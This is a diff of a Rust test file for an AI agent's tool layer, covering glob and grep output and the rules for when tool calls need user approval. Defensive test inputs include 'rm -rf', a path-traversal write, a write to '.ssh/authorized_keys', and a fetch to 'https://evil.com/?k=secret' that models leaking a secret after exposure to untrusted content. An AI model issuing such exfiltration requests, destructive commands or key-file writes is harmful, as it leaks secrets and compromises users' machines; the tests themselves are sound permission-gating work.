@@ -9,15 +9,20 @@ use marlowe_agent::{Consequence, Exposure, ToolHost};
 use marlowe_exec::{BuiltinTools, SearchResponse, SearchResult};
 use serde_json::json;
 
-const NAMES: [&str; 11] = [
-    "read", "write", "edit", "glob", "grep", "bash", "powershell", "python", "web_fetch", "arxiv", "paper",
+const NAMES: [&str; 22] = [
+    "read", "write", "edit", "multi_edit", "notebook_edit", "glob", "grep", "bash", "powershell", "python", "job_output",
+    "job_watch", "job_kill", "web_fetch", "arxiv", "paper", "symbols", "definition", "references", "hover", "diagnostics",
+    "rename_symbol",
 ];
+
+const VERIFY: [&str; 4] = ["project", "service", "http_check", "browser"];
 
 #[test]
 fn the_declared_tools_are_exactly_the_implemented_ones() {
     let ws = Ws::new("et-specs");
     let t = ws.tools();
-    let specs = t.specs();
+    // The verify group (project, service, http_check, browser) has its own tests.
+    let specs: Vec<_> = t.specs().into_iter().filter(|s| !VERIFY.contains(&s.name.as_str())).collect();
     let names: Vec<_> = specs.iter().map(|s| s.name.as_str()).collect();
     assert_eq!(names, NAMES, "web_search appears only with a backend");
     for s in &specs {
@@ -115,20 +120,33 @@ fn glob_lists_filters_and_skips_build_output() {
     ws.put("target/junk.rs", "");
     let t = ws.tools();
     let o = call(&t, "glob", json!({"pattern": "*.rs"}));
-    assert_eq!(o.content.lines().take(3).collect::<Vec<_>>(), ["a.rs", "src/b.rs", "src/deep/c.rs"]);
+    // Newest first; the three files were written within a moment of each other.
+    let mut listed = o.content.lines().take(3).collect::<Vec<_>>();
+    listed.sort_unstable();
+    assert_eq!(listed, ["a.rs", "src/b.rs", "src/deep/c.rs"]);
     assert!(o.content.contains("not searched") && o.content.contains("target"));
     assert!(!o.content.contains("junk.rs"));
     let o = call(&t, "glob", json!({"pattern": "src/*.rs"}));
     assert!(o.content.starts_with("src/b.rs") && !o.content.contains("c.rs"), "{}", o.content);
+    // Newest first: touching an older file puts it at the top.
+    let old = std::time::SystemTime::now() - std::time::Duration::from_secs(3_600);
+    for f in ["a.rs", "src/b.rs", "src/deep/c.rs"] {
+        std::fs::OpenOptions::new().write(true).open(ws.path(f)).unwrap().set_modified(old).unwrap();
+    }
+    std::fs::OpenOptions::new().write(true).open(ws.path("src/deep/c.rs")).unwrap().set_modified(std::time::SystemTime::now()).unwrap();
+    let o = call(&t, "glob", json!({"pattern": "*.rs"}));
+    assert_eq!(o.content.lines().next(), Some("src/deep/c.rs"), "{}", o.content);
     let o = call(&t, "glob", json!({"path": "target"}));
     assert!(o.content.contains("junk.rs"), "naming a skipped directory searches it");
     let o = call(&t, "glob", json!({"pattern": "*.xyz"}));
-    assert!(o.content.contains("none matched"), "{}", o.content);
+    assert!(o.content.contains("no files matched"), "{}", o.content);
     let o = call(&t, "glob", json!({"path": "a.rs"}));
     assert!(o.is_error);
-    assert!(call(&t, "glob", json!({"pattern": "*.MD"})).content.contains("none matched"));
+    assert!(call(&t, "glob", json!({"pattern": "*.MD"})).content.contains("no files matched"));
+    // Globs are case-sensitive, as in ripgrep.
     ws.put("Readme.MD", "");
-    assert!(call(&t, "glob", json!({"pattern": "*.md"})).content.starts_with("Readme.MD"));
+    assert!(call(&t, "glob", json!({"pattern": "*.md"})).content.contains("no files matched"));
+    assert!(call(&t, "glob", json!({"pattern": "*.MD"})).content.starts_with("Readme.MD"));
 }
 
 /// Found live: `**/Cargo.toml` returned 0 paths in a 25-manifest workspace because `**` was two
@@ -154,7 +172,7 @@ fn globstar_finds_every_manifest_at_every_depth() {
     let o = call(&t, "glob", json!({"pattern": r".\crates\**\Cargo.toml"}));
     assert_eq!(o.summary, "25 paths", "{}", o.content);
     ws.put("crates/c01/Cargo.toml", "x = 1\n");
-    let o = call(&t, "grep", json!({"pattern": "x", "glob": "**/c01/*.toml"}));
+    let o = call(&t, "grep", json!({"pattern": "x", "glob": "**/c01/*.toml", "output_mode": "content"}));
     assert!(o.content.starts_with("crates/c01/Cargo.toml:1:"), "{}", o.content);
 }
 
@@ -163,19 +181,28 @@ fn grep_reports_matches_context_and_how_many_files_it_read() {
     let ws = Ws::new("et-grep");
     ws.put("a.txt", "alpha\nbeta\ngamma\ndelta\n");
     ws.put("b.txt", "nothing\n");
-    ws.put("c.bin", [0xffu8, 0xfe, 0x00]);
+    // (Not 0xff 0xfe first: that is a UTF-16 byte-order mark, which ripgrep decodes as text.)
+    ws.put("c.bin", [0x89u8, b'P', b'N', b'G', 0x00, 0x01]);
     let t = ws.tools();
-    let o = call(&t, "grep", json!({"pattern": "gam+a"}));
+    let content = |args: serde_json::Value| {
+        let mut args = args;
+        args["output_mode"] = json!("content");
+        call(&t, "grep", args)
+    };
+    // The default answer is the list of files.
+    assert!(call(&t, "grep", json!({"pattern": "gam+a"})).content.starts_with("a.txt\n[1 file(s) contain a NUL byte"));
+    let o = content(json!({"pattern": "gam+a"}));
     assert!(o.content.starts_with("a.txt:3:gamma"), "{}", o.content);
-    assert_eq!(o.summary, "1 results · 2 files");
-    assert!(o.content.contains("not text"));
-    let o = call(&t, "grep", json!({"pattern": "gamma", "context": 1}));
+    assert_eq!(o.summary, "1 matches · 1 files");
+    assert!(o.content.contains("NUL byte"), "{}", o.content);
+    let o = content(json!({"pattern": "gamma", "context": 1}));
     assert_eq!(o.content.lines().take(3).collect::<Vec<_>>(), ["a.txt-2-beta", "a.txt:3:gamma", "a.txt-4-delta"]);
-    let o = call(&t, "grep", json!({"pattern": "gamma", "context": "1"}));
+    let o = content(json!({"pattern": "gamma", "context": "1"}));
     assert!(!o.is_error);
-    assert!(call(&t, "grep", json!({"pattern": "GAMMA"})).content.contains("no line matched"));
-    assert!(call(&t, "grep", json!({"pattern": "(?i)GAMMA"})).content.starts_with("a.txt:3"));
-    assert!(call(&t, "grep", json!({"pattern": "alpha", "glob": "b.*"})).content.contains("no line matched"));
+    assert!(content(json!({"pattern": "GAMMA"})).content.contains("no line matched"));
+    assert!(content(json!({"pattern": "(?i)GAMMA"})).content.starts_with("a.txt:3"));
+    assert!(content(json!({"pattern": "GAMMA", "-i": true})).content.starts_with("a.txt:3"));
+    assert!(content(json!({"pattern": "alpha", "glob": "b.*"})).content.contains("no line matched"));
 }
 
 #[test]
@@ -183,11 +210,11 @@ fn grep_refuses_what_it_does_not_declare() {
     let ws = Ws::new("et-grep-refuse");
     let t = ws.tools();
     for (args, needle) in [
-        (json!({"pattern": "x", "-i": true}), "is not a parameter"),
+        (json!({"pattern": "x", "-z": true}), "is not a parameter"),
         (json!({}), "required"),
         (json!({"pattern": ""}), "empty"),
         (json!({"pattern": "foo("}), "not a valid regular expression"),
-        (json!({"pattern": "x", "context": 21}), "0 to 20"),
+        (json!({"pattern": "x", "context": 201}), "0 to 200"),
         (json!({"pattern": "x", "context": "many"}), "whole number"),
         (json!({"pattern": "x", "glob": ""}), "empty"),
     ] {
@@ -195,8 +222,9 @@ fn grep_refuses_what_it_does_not_declare() {
         assert!(o.is_error && o.content.contains(needle), "{args}: {}", o.content);
     }
     ws.put("f.txt", "x");
+    // A single file is searched as itself.
     let o = call(&t, "grep", json!({"pattern": "x", "path": "f.txt"}));
-    assert!(o.is_error && o.content.contains("is a file"));
+    assert!(!o.is_error && o.content == "f.txt", "{}", o.content);
     let o = call(&t, "grep", json!({"pattern": "a{300}{300}"}));
     assert!(o.is_error && o.content.contains("not a valid regular expression"), "{}", o.content);
 }
@@ -205,9 +233,15 @@ fn grep_refuses_what_it_does_not_declare() {
 fn grep_degrades_to_counts_past_the_line_budget() {
     let ws = Ws::new("et-grep-budget");
     ws.put("big.txt", "hit\n".repeat(500));
-    let o = call(&ws.tools(), "grep", json!({"pattern": "hit"}));
-    assert!(o.content.contains("500 matches in 1 file(s)") && o.content.contains("big.txt (500)"), "{}", &o.content[o.content.len() - 300..]);
-    assert_eq!(o.content.lines().filter(|l| l.starts_with("big.txt:")).count(), 200);
+    let t = ws.tools();
+    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "content"}));
+    assert_eq!(o.content.lines().filter(|l| l.starts_with("big.txt:")).count(), 250, "head_limit defaults to 250");
+    assert!(o.content.contains("pass offset=250 for the next page"), "{}", &o.content[o.content.len() - 200..]);
+    // The count mode has the whole number; `offset` pages on.
+    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "count"}));
+    assert_eq!(o.content, "big.txt:500");
+    let o = call(&t, "grep", json!({"pattern": "hit", "output_mode": "content", "offset": 250, "head_limit": 300}));
+    assert!(o.content.starts_with("big.txt:251:hit") && o.content.lines().filter(|l| l.starts_with("big.txt:")).count() == 250, "{}", o.content);
 }
 
 #[test]
@@ -229,20 +263,20 @@ fn consequences_follow_the_workspace_boundary() {
         "sub/../../escape.txt".to_string(),
     ] {
         match c("write", json!({"path": path})) {
-            Consequence::Ask { summary } => assert!(summary.contains("outside the workspace"), "{summary}"),
+            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert!(summary.contains("outside the workspace"), "{summary}"),
             Consequence::Free => panic!("{path} must ask"),
         }
     }
     for shell in ["bash", "powershell"] {
         match c(shell, json!({"command": "rm -rf x\nsecond line"})) {
-            Consequence::Ask { summary } => assert_eq!(summary, format!("{shell}: rm -rf x (+1 line)")),
+            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert_eq!(summary, format!("{shell}: rm -rf x (+1 line)")),
             Consequence::Free => panic!("{shell} must ask"),
         }
     }
-    assert!(matches!(c("python", json!({"code": "print(1)"})), Consequence::Ask { .. }));
-    assert!(matches!(c("python", json!({"path": "s.py"})), Consequence::Ask { .. }));
+    assert!(matches!(c("python", json!({"code": "print(1)"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
+    assert!(matches!(c("python", json!({"path": "s.py"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     let rootless = BuiltinTools::new(None);
-    assert!(matches!(rootless.consequence(&req("write", json!({"path": "a.txt"}))), Consequence::Ask { .. }));
+    assert!(matches!(rootless.consequence(&req("write", json!({"path": "a.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
 }
 
 #[test]
@@ -256,7 +290,7 @@ fn a_home_directory_workspace_frees_no_writes() {
         .iter()
         .fold(home.clone(), |p, c| p.join(c));
     for path in [startup.to_string_lossy().into_owned(), "x.bat".into(), ".ssh/authorized_keys".into()] {
-        assert!(matches!(t.consequence(&req("write", json!({"path": path}))), Consequence::Ask { .. }), "{path}");
+        assert!(matches!(t.consequence(&req("write", json!({"path": path}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }), "{path}");
     }
     assert!(marlowe_exec::paths::is_broad_root(&home));
     if let Some(root) = home.ancestors().last() {
@@ -282,8 +316,8 @@ fn untrusted_content_gates_search_and_new_hosts() {
     let mut ex = Exposure::default();
     assert_eq!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Free);
     ex.tainted = true;
-    assert!(matches!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Ask { .. }));
-    assert!(matches!(t.consequence_exposed(&req("web_search", json!({"query": "secret"})), &ex), Consequence::Ask { .. }));
+    assert!(matches!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
+    assert!(matches!(t.consequence_exposed(&req("web_search", json!({"query": "secret"})), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     ex.approved_hosts.insert("docs.rs".into());
     assert_eq!(t.consequence_exposed(&fetch("https://docs.rs/serde"), &ex), Consequence::Free);
     assert_eq!(t.consequence_exposed(&req("read", json!({"path": "a"})), &ex), Consequence::Free);
@@ -308,7 +342,7 @@ fn a_link_out_of_the_workspace_does_not_make_a_write_free() {
         return;
     }
     let t = ws.tools();
-    assert!(matches!(t.consequence(&req("write", json!({"path": "out/x.txt"}))), Consequence::Ask { .. }));
+    assert!(matches!(t.consequence(&req("write", json!({"path": "out/x.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     // Remove the junction itself, not its target's contents.
     let _ = std::fs::remove_dir(&link);
 }
@@ -347,10 +381,11 @@ fn web_search_goes_through_the_injected_backend() {
 }
 
 #[test]
-fn web_fetch_refuses_plain_http_and_bad_urls() {
+fn web_fetch_refuses_other_schemes_and_bad_urls() {
+    // Plain http:// is upgraded to https:// (T20); that path is covered offline in web_tests.rs.
     let ws = Ws::new("et-fetch");
     let t = ws.tools();
-    for url in ["http://example.com", "ftp://x", "example.com", "https://user@host/", ""] {
+    for url in ["ftp://x", "example.com", "https://user@host/", ""] {
         let o = call(&t, "web_fetch", json!({"url": url}));
         assert!(o.is_error, "{url}: {}", o.content);
     }
